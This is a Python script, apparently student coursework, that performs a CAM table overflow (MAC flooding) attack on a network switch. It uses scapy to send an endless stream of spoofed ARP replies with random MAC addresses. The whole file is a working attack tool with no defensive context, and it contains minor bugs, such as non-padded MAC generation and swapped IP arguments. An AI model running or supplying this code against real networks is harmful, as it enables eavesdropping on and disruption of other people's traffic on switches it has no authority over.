#!/usr/bin/env python3
"""
file:       cam_overflow.py
author:     Chris Tremblay <cst1465@rit.edu>
language:   Python3
date:       2/13/2023, National Clean Your Computer Day
description:
    perform a cam overflow attack
"""

import scapy.all as scapy
import sys
import os
import traceback
import psutil
from math import ceil
from random import getrandbits
from binascii import b2a_hex
from multiprocessing import Process, Queue
from color_prefixes import *

# constants
MAC_ADDR_SIZE  = 6
SWITCH_MEMSIZE = 2000

SRC_IP = "10.0.0.1"
DST_IP = "10.0.0.2"

VERBOSE = False

def get_random_mac() -> str:
    """
    description:
        generate a random mac address
    returns:
        the mac address in string form
    """
    # generate 48 random bits
    rand_bits = '%x' % getrandbits( 48 )

    # place semicolon to deliniate each pair of bytes
    mac = ""
    for i in range( 1, len( rand_bits ), 2 ):
        mac += rand_bits[i-1] + rand_bits[i] + ":"

    # strip off last element and return
    mac = mac[:-1]
    return mac

def send_arp( dst_addr: str, src_addr: str, src_mac: str ):
    """
    description:
        send a malicious arp to make switch CAM table
        start learning bad MAC addrs
    parameters:
        dst_addr -> the destination addr in arp broadcast
        src_addr -> the source addres of arp broadcast
        src_mac  -> the source mac address 
    """
    # create packet
    pkt = scapy.Ether()/scapy.ARP()
    pkt[scapy.ARP].op    = 2
    pkt[scapy.ARP].hwsrc = src_mac
    pkt[scapy.ARP].pdst  = dst_addr
    pkt[scapy.ARP].psrc  = src_addr
    pkt[scapy.Ether].dst = "ff:ff:ff:ff:ff:ff"

    # send
    scapy.sendp( pkt, verbose=VERBOSE )
    return

def cam_overflow( src_ip: str, dst_ip: str, mem_size: int ):
    """
    """
    # figure out how many macs to send to take up CAM
    if( not mem_size is None ):
        num_macs = ceil( mem_size / MAC_ADDR_SIZE )
    else:
        num_macs = -1
    
    # start sending malicious arps
    count = 0
    try:
        while( True ):
            send_arp( dst_ip, src_ip, get_random_mac() )
            count += 1
            if( num_macs > 0 and count == num_macs ):
                print( "enough MACS have been learned to overflow switch" )
    except Exception as e:
        print( RED_PREFIX, e, RED_SUFFIX )
    return

def main():
    """
    description:
        driver function
    """
    cam_overflow( DST_IP, SRC_IP, SWITCH_MEMSIZE )
    return

if( __name__ == "__main__" ):
    main()
